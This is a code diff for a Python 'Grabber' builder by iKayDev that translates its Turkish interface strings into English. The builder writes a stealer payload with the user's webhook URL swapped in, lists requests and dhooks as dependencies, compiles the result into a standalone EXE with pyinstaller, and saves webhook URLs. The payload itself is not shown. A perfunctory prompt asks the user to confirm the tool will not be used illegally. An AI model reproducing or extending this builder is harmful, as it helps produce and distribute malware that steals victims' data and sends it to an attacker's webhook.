@@ -26,7 +26,8 @@ def logo():
                                   "  "$$$$$P"
                                       $$P*"
                                      .$"
-                                     "                 by iKayDev''', "green")
+                                     "                 by iKayDev'''
+                     , "green")
 
 
 def menu():
@@ -151,7 +152,7 @@ main()
     grabberwebhook = open(adi + ".py", "w")
     payload.replace("/","//")
     grabberwebhook.write(payload.replace("WEBHOOKBURAYA", webhook))
-    gerekli = open(adi + " Gerekliler.txt", "w")
+    gerekli = open(adi + " requirements.txt", "w")
     gerekli.write("""
     requests
     dhooks
@@ -159,25 +160,25 @@ main()
     if exe == "E":
         print("\n" * 100)
         logo()
-        termcolor.cprint("EXE oluşturuluyor...", "red")
+        termcolor.cprint("EXE is being created...", "red")
         os.system("pyinstaller --onefile " + adi + ".py")
-        termcolor.cprint("Grabber ' " + adi + ".exe ' adı ile 'dist' klasörünün içine başarıyla oluşturuldu.", "green")
+        termcolor.cprint("Grabber ' " + adi + ".exe ' successfully created in the 'dist' folder with the name.", "green")
         menu2()
     elif exe == "e":
         logo()
-        termcolor.cprint("EXE oluşturuluyor...", "red")
+        termcolor.cprint("EXE is being created...", "red")
         os.system("pyinstaller --onefile " + adi + ".py")
         print("\n" * 100)
-        termcolor.cprint("Grabber ' " + adi + ".exe ' adı ile 'dist' klasörünün içine başarıyla oluşturuldu.", "green")
+        termcolor.cprint("Grabber ' " + adi + ".exe ' successfully created in the 'dist' folder with the name.", "green")
         menu2()
     else:
         print("\n" * 100)
-        termcolor.cprint("Grabber ' " + adi + ".py ' adı ile başarıyla oluşturuldu.", "green")
+        termcolor.cprint("Grabber ' " + adi + ".py ' successfully created with the name.", "green")
         menu2()
 def izin():
-    termcolor.cprint("Uygulamayı illegal işlemler için kullanmayacağınızı onaylıyor musunuz?", "red")
-    onay = input("Onaylıyorsanız 'EVET' yazın: ")
-    if onay == "EVET":
+    termcolor.cprint("Do you confirm that you will not use the application for illegal purposes?", "red")
+    onay = input("If you confirm, write 'YES': ")
+    if onay == "YES":
         print("\n" * 100)
         menu()
     elif onay == "evet":
@@ -186,17 +187,17 @@ def izin():
     else:
         print("\n" * 100)
         logo()
-        print("Lütfen devam etmek için 'EVET' yazın, '" + onay + "' geçersiz bir argümandır.")
+        print("Please type 'YES' to continue, '" + onay + "' is an invalid argument.")
         izin()
 
 
 def giris():
-    girdi = input("Komut: ")
+    girdi = input("Command: ")
     if girdi == "1":
         grabbermenu()
     elif girdi == "2":
         logo()
-        webhooklar = open("Kaydedilmiş Webhook.txt", "w")
+        webhooklar = open("Saved Webhook.txt", "w")
         kaydedilecek = input("Webhook URL: ")
         webhooklar.write(kaydedilecek)
         print("\n" * 100)
@@ -205,7 +206,7 @@ def giris():
         print("\n" * 100)
         menu()
     elif girdi == "4":
-        termcolor.cprint("Görüşmek üzere!", "red")
+        termcolor.cprint("See You Later!", "red")
         sys.exit()
 logo()
 izin()
